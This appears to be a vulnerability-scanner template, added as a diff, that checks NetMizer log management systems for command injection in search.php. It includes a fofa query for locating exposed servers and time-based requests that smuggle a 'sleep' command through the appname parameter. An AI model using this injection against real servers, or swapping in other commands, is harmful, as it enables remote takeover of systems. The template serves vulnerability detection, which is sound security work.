@@ -1,0 +1,29 @@
+id: netmizer-log-system-search-php-cmd-exec
+
+info:
+  name: "NetMizer日志管理系统search.php文件命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="NetMizer 日志管理系统"
+
+    NetMizer日志管理系统中的search.php文件存在命令执行漏洞。攻击者可利用该漏洞在服务器上执行任意系统命令，从而获取系统的控制权。
+  tags: NetMizer
+
+http:
+- raw:
+  - |
+    GET /data/search/search.php?action=addtask&appname=search;sleep+5+%23 HTTP/1.1
+    Host: {{Hostname}}
+  - |
+    GET /data/search/search.php?action=addtask&appname=search;sleep+8+%23 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+    - type: status
+      status: [200]
+    - type: dsl
+      dsl:
+      - duration_1>=5 && duration_1<=6
+      - duration_2>=8 && duration_2<=9
+      condition: and
